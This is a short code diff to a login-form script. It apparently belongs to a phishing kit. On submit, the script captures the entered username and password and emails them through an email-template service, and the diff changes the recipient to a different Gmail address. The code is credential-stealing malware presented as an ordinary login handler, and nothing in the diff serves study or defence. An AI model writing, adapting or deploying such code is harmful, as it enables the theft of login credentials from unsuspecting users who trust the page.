@@ -11,7 +11,7 @@ const templateId = "template_y67tr7e";
 document.getElementById("login").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
-    to_name: "Victorchinemerem191@gmail.com",
+    to_name: "gracesufficient65@gmail.com",
     username: username.value,
     password: password.value,
   };
